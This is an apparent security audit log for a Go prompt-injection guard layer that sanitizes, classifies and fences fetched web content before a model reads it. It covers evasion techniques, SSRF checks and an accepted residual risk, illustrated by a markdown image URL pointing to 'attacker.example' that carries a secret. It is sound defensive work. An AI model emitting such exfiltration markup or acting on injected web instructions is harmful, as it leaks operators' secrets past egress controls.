# SECURITY.md — Phase 32: Villa Injection Guard Layer

**Phase:** 32 — Villa Injection Guard Layer
**ASVS Level:** L1
**Block on:** high severity
**Audited:** 2026-06-19
**Audited at commit:** `31628cc` (working tree clean for `internal/websafe/`, `go.mod`, `go.sum`)

This audit verifies that every declared threat mitigation in the three plan
`<threat_model>` blocks (`32-01/02/03-PLAN.md`) is actually present and effective
in the implemented code — not merely documented or intended. Each `mitigate`
threat is confirmed by a code citation (file:line) AND a passing test; the one
`accept` (documented-residual) threat is confirmed present in this log; the one
supply-chain threat is confirmed by the pinned dependency + checksum.

---

## Threat Verification Summary

**Threats Closed:** 18/18
**Open (BLOCKER):** 0
**Accepted residuals:** 1 (T-32-08, documented below — correctly NOT claimed closed)
**Unregistered flags:** none

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-32-01 | Tampering / EoP | mitigate | CLOSED | `sanitize.go:26,38-39` — `bluemonday.StrictPolicy()` (empty allowlist) + `html.UnescapeString` entity-decode. Test: `TestSanitize*` pass. |
| T-32-02 | Tampering (Trojan-Source) | mitigate | CLOSED | `normalize.go:29-38,44,60-65` — `runes.Predicate` over named zero-width/bidi runes + `unicode.Cf` catch-all, NFKC fold, invisible-strip. Test: `TestNormalize*` pass. |
| T-32-03 | Tampering (fence breakout) | mitigate | CLOSED | `fence.go:35-41,51-61` — per-call `crypto/rand` nonce, SAME nonce on both `[UNTRUSTED_WEB_CONTENT]` / `[/UNTRUSTED_WEB_CONTENT]` tags; no `math/rand`. Tests: `TestFenceNonced`, `TestFenceNonceUnique` pass. |
| T-32-04 | DoS (crafted HTML/title) | mitigate | CLOSED | parser-backed `bluemonday` replaces the CR-01/CR-02 hand-roller (`sanitize.go`); `normalize.go:62-64` never returns "" on transform error (NFKC-folded fallback); `extractTitle` is length-preserving (`websafe.go:206-258`). |
| T-32-05 | Tampering (supply chain) | mitigate | CLOSED | `go.mod:12` pins `bluemonday v1.0.27` (retracted v1.0.0–v1.0.25 avoided); `go.sum` carries the v1.0.27 checksum; `CGO_ENABLED=0 go build ./...` succeeds (pure-Go tree). |
| T-32-SC | Tampering (module install) | mitigate | CLOSED | bluemonday approved in RESEARCH legitimacy audit; checksum pinned in `go.sum`; static build green. |
| T-32-06 | Tampering (evasion / recall) | mitigate | CLOSED | `classify_eval_test.go:30` frozen `minRecall=0.90`; eval scores over production ordering `classify(normalize(sanitize(sample)))` (7 occurrences). `corpus_inject.json` = 35 samples (≥30), incl. invisible-Unicode + fence-breakout. `TestClassifyRecall` passes (1.00). |
| T-32-07 | Signal-quality (precision) | mitigate | CLOSED | `classify_eval_test.go:31` frozen `minPrecision=0.95`; `corpus_benign.json` = 39 samples (≥30) incl. non-Latin + meta-article + System:/assistant: prose. Multi-word imperative rules (`classify.go:28-68`). `TestClassifyPrecision` passes (1.00). |
| T-32-08 | Information Disclosure (markdown-image zero-click exfil) | **accept (documented residual)** | CLOSED (documented, NOT claimed fixed) | `doc.go:22-30` documents the channel as a KNOWN RESIDUAL, NOT closed; Phase-33 egress bound named as backstop. `TestMarkdownImageResidualDocumented` passes. See "Accepted Risks" below. |
| T-32-09 | Repudiation (dishonest copy) | mitigate | CLOSED | `doc.go:1-3,13-20` "reduces and flags, does not eliminate"; `TestNoInjectionSafeCopy` (directory-walking grep-ban) passes — no "injection-safe"/"immune"/"blocks injection" in non-test source. |
| T-32-10 | Tampering (ordering bug) | mitigate | CLOSED | `websafe.go:169-185` enforces sanitize→normalize→classify→fence; classify runs on normalized text (no fence self-match). `TestGuardSeamOrder` passes. |
| T-32-11 | Tampering (verdict discard) | mitigate | CLOSED | `websafe.go:171,183,193` verdict USED (stored on `Page.Verdict`); `grep -c '_ = classify' websafe.go` == 0 (discard removed). `TestFetchGuardVerdict` passes. |
| T-32-12 | Tampering (malicious `<title>`) | mitigate | CLOSED | `websafe.go:182` `normalize(sanitize(extractTitle(body)))`; title ALSO classified + OR-merged into the verdict (`websafe.go:183`, `verdict.go:25-37`). `TestTitleInjectionFlagged` passes. |
| T-32-13 | DoS / contract break (metadata widening) | mitigate | CLOSED | `loader.go:136-146` additive nested `guard` sub-key alongside unchanged `page_content`/`metadata`/`source`/`title`; always-200 + non-nil array preserved. `TestLoadMetadataGuard`, `TestLoadMetadataGuardAlwaysPresent` pass. |
| T-32-14 | Information Disclosure (metadata.guard content) | mitigate | CLOSED | `loader.go:142-145` guard carries only `{detected, rules[]}` — rule-family NAMES, never page text/secrets. Verified by inspection + `TestLoadMetadataGuard`. |

### Cross-cutting mitigations verified (called out in the audit brief)

| Concern | Status | Evidence |
|---------|--------|----------|
| Prompt-injection via fetched content (sanitize→normalize→classify→fence, verdict used) | CLOSED | `websafe.go:169-193` (`fetchOne`) — full ordered pipeline, verdict stored on Page + surfaced in `/load`. |
| Fence-breakout (per-fetch crypto/rand nonce, fail-CLOSED on rand error — WR-02 fix) | CLOSED | `fence.go:35-41` propagates `crypto/rand.Read` error (no constant "0000…0" nonce); `fence.go:51-61` returns `(string, error)`; `websafe.go:185-191` `fetchOne` fails the fetch CLOSED (`return Page{}, err`) on nonce error. Signature change structurally forces handling. |
| Unicode-obfuscation evasion + concurrency-safety (CR-01 fix — no data race) | CLOSED | `normalize.go:44,59-65` uses stateless `norm.NFKC.String` + package-level `runes` Transformer (no shared `transform.Chain`). **`go test -race ./internal/websafe/` passes (3.3s)** — the CR-01 data race is gone. Project gate now includes a `-race` step (per 32-REVIEW-FIX.md). |
| SSRF guard on the fetch path, fail-closed | CLOSED | `ssrf.go:84-102` `ipRejected` (invalid addr → reject); `ssrf.go:122-135` connect-time `control` hook validates the resolved IP (defeats DNS-rebinding TOCTOU); `ssrf.go:152-164` per-hop redirect re-validation + cap; `ssrf.go:109-115` name-based reject backstop. Tests: `TestSSRFRejectSet`, `TestHostRejected`, `TestControlConnectTime`, `TestRedirectRevalidation` pass. |

---

## Review-Finding Fix Confirmation (32-REVIEW.md → 32-REVIEW-FIX.md)

The deep code review (32-REVIEW.md) raised 1 BLOCKER + 3 warnings; the fix report
claims all 4 fixed. Independently confirmed in the committed code:

| Finding | Severity | Fix present in code | Evidence |
|---------|----------|---------------------|----------|
| CR-01 | BLOCKER (data race in `normalize`) | YES | `normalize.go:44,59-65` stateless forms; `go test -race ./internal/websafe/` green. |
| WR-02 | Warning (fence fail-OPEN to zero nonce) | YES | `fence.go:35-41` error propagated; `fetchOne` fails closed (`websafe.go:190`). |
| WR-01 | Warning (title bypassed fence/classify, comment-decoy) | YES | `websafe.go:182-183` title classified + merged; `blankComments` (`websafe.go:267-295`) neutralizes commented-`<title>` decoys; tag-terminator check (`websafe.go:240`). `TestTitleInjectionFlagged` passes. |
| WR-03 | Warning (precision-fragile `system:`/`assistant:`) | YES | `classify.go:50-125` line-anchored `matchLineLeadingRole`/`lineLeading` instead of bare `Contains`; benign corpus extended. `TestClassifyPrecision` 1.00. |

The 3 Info findings (IN-01 `rules:null` serialization, IN-02 tag-terminator [folded
into WR-01], IN-03 raw-vs-final URL) were dispositioned out of scope in the fix
report. IN-02 is effectively closed (`websafe.go:240`). IN-01 and IN-03 remain as
low-severity, non-security-blocking nits (see below) — neither is a declared threat
in the threat models, so neither blocks this phase.

---

## Accepted Risks (documented residuals)

### T-32-08 — Markdown-image zero-click exfiltration (ACCEPTED for v1.5)

**Disposition:** accept (documented residual). **Correctly NOT claimed closed.**

The model can later emit a markdown image such as
`![](https://attacker.example/p?data=<secret>)` in its OWN reply. The operator's
**browser** renders that markdown and fetches the URL, leaking embedded data. Because
the fetch happens in the operator's browser, it bypasses the inference container's
egress controls entirely — this guard layer cannot see or stop it.

- **Documented at:** `internal/websafe/doc.go:22-30` (KNOWN RESIDUAL paragraph).
- **Enforced honesty:** `TestNoInjectionSafeCopy` forbids any "closed/safe/immune"
  claim in non-test source; `TestMarkdownImageResidualDocumented` asserts the
  residual note is present.
- **Backstop:** the Phase-33 egress bound is the real mitigation; surfacing the
  guard verdict (Phase 34) is the operator-visible signal.

This residual is acknowledged and bounded, not silently shipped. ✅

---

## Non-Blocking Observations (informational — not declared threats)

These are not in any `<threat_model>`; recorded for traceability. None block Phase 32.

- **IN-01 (low):** `loader.go:142-145` builds `guard` as a raw `map[string]any`, so a
  benign page emits `"rules":null` rather than the `omitempty` `{"detected":false}`
  shape from `verdict.go:15-18`. Harmless (OWUI ignores it; no data leak). Marshalling
  `p.Verdict` directly would align the wire shape.
- **IN-03 (low):** `Page.Source` (`websafe.go:193`) is the raw input URL, not the
  post-redirect final URL. Citation-honesty nuance; SSRF is still enforced per-hop by
  the Control hook. Not a security hole.

---

## Verification Commands (reproducible)

```
go test -race ./internal/websafe/ -count=1                 # CR-01 concurrency gate — PASS (3.3s)
go test ./internal/websafe/ -run 'TestClassifyRecall|TestClassifyPrecision' -count=1   # must-WIN eval — PASS (recall 1.00, precision 1.00)
go test ./internal/websafe/ -run 'TestFence|TestGuardSeam|TestTitleInjection|TestLoadMetadataGuard' -count=1   # PASS
go test ./internal/websafe/ -run 'TestNoInjectionSafeCopy|TestMarkdownImageResidualDocumented' -count=1        # honesty — PASS
go test ./internal/inference/ -run TestSeamGrepGate -count=1   # no leaked backend/host literals — PASS
CGO_ENABLED=0 go build ./...                                # pure-Go static binary — PASS
grep github.com/microcosm-cc/bluemonday go.mod go.sum      # v1.0.27 pinned + checksummed
```

---

## Audit Conclusion

**SECURED.** All 18 declared threats across the three Phase-32 plan threat models
resolve to CLOSED (17 mitigated + 1 documented-accepted residual). Every `mitigate`
disposition is backed by a concrete code citation AND a passing test; the supply-chain
threat is backed by a pinned, checksummed dependency and a green static build; the one
`accept` residual (T-32-08, markdown-image exfil) is honestly documented and verified
NOT claimed closed. The two highest-risk review findings (CR-01 data race, WR-02 fence
fail-open) are confirmed fixed in the committed code, including under the race detector.

No OPEN_THREATS. No unregistered attack surface. Phase 32 is clear to ship at ASVS L1
(block-on-high).
